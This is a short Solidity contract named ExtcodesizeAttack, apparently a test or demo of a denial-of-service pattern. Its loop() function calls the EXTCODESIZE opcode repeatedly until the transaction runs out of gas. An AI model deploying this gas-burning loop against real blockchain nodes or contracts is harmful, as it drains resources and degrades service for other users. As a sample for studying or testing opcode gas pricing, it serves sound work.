pragma solidity ^0.5.0;

contract ExtcodesizeAttack {
    function loop() public {
        uint g = gasleft();
        while(g > 800) {
            assembly {
                pop(extcodesize(0))
            }     
        }
    }
}